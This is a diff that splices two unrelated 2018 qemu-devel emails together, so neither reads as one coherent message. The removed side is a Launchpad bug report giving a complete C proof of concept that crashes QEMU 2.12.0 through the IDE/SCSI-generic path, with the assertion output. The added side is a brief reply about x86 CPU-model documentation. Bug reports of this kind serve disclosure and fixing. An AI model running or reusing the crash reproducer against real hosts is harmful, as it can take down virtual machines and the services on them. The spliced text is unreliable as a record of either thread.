@@ -1,33 +1,26 @@
-Received: from eggs.gnu.org ([2001:4830:134:3::10]:36927)
+Received: from eggs.gnu.org ([2001:4830:134:3::10]:37502)
 	by lists.gnu.org with esmtp (Exim 4.71)
-	(envelope-from <bounces@canonical.com>) id 1fUnDl-0002iu-66
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:58 -0400
+	(envelope-from <armbru@redhat.com>) id 1fUnGM-0003XV-9l
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:03:39 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
-	(envelope-from <bounces@canonical.com>) id 1fUnDh-0000Ga-6M
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:57 -0400
-Received: from indium.canonical.com ([91.189.90.7]:42500)
-	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
-	(Exim 4.71) (envelope-from <bounces@canonical.com>)
-	id 1fUnDg-0000GH-W1
-	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:00:53 -0400
-Received: from loganberry.canonical.com ([91.189.90.37])
-	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
-	id 1fUnDf-00032l-Sz
-	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:00:51 +0000
-Received: from loganberry.canonical.com (localhost [127.0.0.1])
-	by loganberry.canonical.com (Postfix) with ESMTP id B8C1A2E8019
-	for <qemu-devel@nongnu.org>; Mon, 18 Jun 2018 06:00:51 +0000 (UTC)
+	(envelope-from <armbru@redhat.com>) id 1fUnGI-0001R8-A1
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:03:38 -0400
+Received: from mx3-rdu2.redhat.com ([66.187.233.73]:54796 helo=mx1.redhat.com)
+	by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.71) (envelope-from <armbru@redhat.com>) id 1fUnGI-0001R3-5j
+	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 02:03:34 -0400
+From: Markus Armbruster <armbru@redhat.com>
+References: <20180615141609.20749-1-berrange@redhat.com>
+	<20180615185805.GE7451@localhost.localdomain>
+Date: Mon, 18 Jun 2018 08:03:32 +0200
+In-Reply-To: <20180615185805.GE7451@localhost.localdomain> (Eduardo Habkost's
+	message of "Fri, 15 Jun 2018 15:58:05 -0300")
+Message-ID: <878t7cskaz.fsf@dusky.pond.sub.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
-Date: Mon, 18 Jun 2018 05:52:48 -0000
-From: Thomas Huth <1777315@bugs.launchpad.net>
-Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
-Sender: bounces@canonical.com
-References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
-Message-Id: <152930116851.27230.14961975405216231232.malone@gac.canonical.com>
-Errors-To: bounces@canonical.com
-Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
+Subject: Re: [Qemu-devel] [PATCH] docs: add guidance on configuring CPU
+ models for x86
 List-Id: <qemu-devel.nongnu.org>
 List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
@@ -36,101 +29,33 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-To: qemu-devel@nongnu.org
+To: Eduardo Habkost <ehabkost@redhat.com>
+Cc: "Daniel P. =?utf-8?Q?Berrang=C3=A9?=" <berrange@redhat.com>, Paolo Bonzini <pbonzini@redhat.com>, qemu-devel@nongnu.org, Richard Henderson <rth@twiddle.net>
 
-Are you going to provide a patch for this to the mailing list? (since
-you've assigned the bug to yourself)
+Eduardo Habkost <ehabkost@redhat.com> writes:
 
--- =
+> On Fri, Jun 15, 2018 at 03:16:09PM +0100, Daniel P. Berrang=C3=A9 wrote:
+>> With the recent set of CPU hardware vulnerabilities on x86, it is
+>> increasingly difficult to understand which CPU configurations are
+>> good to use and what flaws they might be vulnerable to.
+>>=20
+>> This doc attempts to help management applications and administrators in
+>> picking sensible CPU configuration on x86 hosts. It outlines which of
+>> the named CPU models are good choices, and describes which extra CPU
+>> flags should be enabled to allow the guest to mitigate hardware flaws.
+>>=20
+>> Signed-off-by: Daniel P. Berrang=C3=A9 <berrange@redhat.com>
+>
+> Thank you very much.
+>
+> I wonder how we could reference this from the man page and
+> qemu-doc.html without saying "look at the QEMU source tree".
 
-You received this bug notification because you are a member of qemu-
-devel-ml, which is subscribed to QEMU.
-https://bugs.launchpad.net/bugs/1777315
+Same way as the other contents there.
 
-Title:
-  Denial of service
+> (I'm not willing to rewrite this using texinfo to make that
+> happen.)
 
-Status in QEMU:
-  New
+Texinfo is simple.
 
-Bug description:
-  Hi,
-  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
-2.12.0
-
-  run the program in qemu-2.12.0:
-  #define _GNU_SOURCE =
-
-  #include <endian.h>
-  #include <sys/syscall.h>
-  #include <unistd.h>
-  #include <fcntl.h>
-  #include <stdio.h>
-  #include <string.h>
-  #include <sys/stat.h>
-  #include <stdint.h>
-  #include <string.h>
-
-  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
-  {
-          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
-                  char buf[128];
-                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
-lock", (uint8_t)a1, (uint8_t)a2);
-                  return open(buf, O_RDWR, 0);
-          } else {
-                  char buf[1024];
-                  char* hash;
-  strncpy(buf, (char*)a0, sizeof(buf) - 1);
-                  buf[sizeof(buf) - 1] =3D 0;
-                  while ((hash =3D strchr(buf, '#'))) {
-                          *hash =3D '0' + (char)(a1 % 10);
-                          a1 /=3D 10;
-                  }
-                  return open(buf, a2, 0);
-          }
-  }
-
-  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
-  void loop()
-  {
-          long res =3D 0;
-  memcpy((void*)0x20000000, "/dev/sg#", 9);
-          res =3D syz_open_dev(0x20000000, 0, 2);
-          if (res !=3D -1)
-                  r[0] =3D res;
-          res =3D syscall(__NR_dup2, r[0], r[0]);
-          if (res !=3D -1)
-                  r[1] =3D res;
-  *(uint8_t*)0x20000ec0 =3D 0;
-  *(uint8_t*)0x20000ec1 =3D 0;
-  *(uint8_t*)0x20000ec2 =3D 0;
-  *(uint8_t*)0x20000ec3 =3D 0;
-  *(uint32_t*)0x20000ec8 =3D 0;
-  *(uint8_t*)0x20000ed8 =3D 0;
-  *(uint8_t*)0x20000ed9 =3D 0;
-  *(uint8_t*)0x20000eda =3D 0;
-  *(uint8_t*)0x20000edb =3D 0;
-  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
-b3", 12);
-          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
-  }
-
-  int main()
-  {
-          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
-          loop();
-          return 0;
-  }
-  this will crash qemu, output information:
-   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
-=3D=3D s->sg.size' failed.
-
-  =
-
-  Thanks =
-
-  owl337
-
-To manage notifications about this bug go to:
-https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions
+If all else fails, ask for my help after soft freeze.
